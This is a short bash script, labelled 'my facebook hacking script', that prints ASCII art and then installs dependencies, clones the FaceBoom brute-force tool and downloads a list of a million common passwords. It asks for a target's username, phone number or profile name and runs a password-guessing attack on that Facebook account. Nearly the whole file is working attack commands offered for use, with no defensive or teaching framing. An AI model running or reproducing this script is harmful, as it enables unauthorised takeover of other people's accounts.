#!/bin/bash
echo "my facebook hacking script"
RED="\e[92m"
ENDCOLOR="\e[0m"

echo -e "${RED}         ___--=--------___
        /. \___\____   _, \_      /-\
       /. .  _______     __/=====@
       \----/  |  / \______/      \-/
   _/         _/ o \
  / |    o   /  ___ \
 / /    o\\ |  / O \ /|      __-_
|o|     o\\\   |  \ \ /__--o/o___-_
| |      \\\-_  \____  ----  o___-
|o|       \_ \     /\______-o\_-
| \       _\ \  _/ / |
\o \_   _/      __/ /
 \   \-/   _       /|_
  \_      / |   - \  |\
    \____/  \ | /  \   |\
            | o |   | \ |
            | | |    \ | \
           / | /      \ \ \
         /|  \o|\--\  /  o |\--\
         \----------' \---------'${ENDCOLOR}"




apt update
apt install git python python3 wget -y
git clone https://github.com/Oseid/FaceBoom
cd FaceBoom
pip install mechanize
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
RED="\e[31m"
ENDCOLOR="\e[0m"
bold=$(tput bold)
normal=$(tput sgr0)


echo -e "${RED}${bold}HELLO I AM KELIVN HER I AM FROM BLACK HAT Enter the user name/moblenumber/profilename${normal} ${ENDCOLOR}"
 
read a 
python3 faceboom.py -t $a -w 10-million-password-list-top-1000000.txt
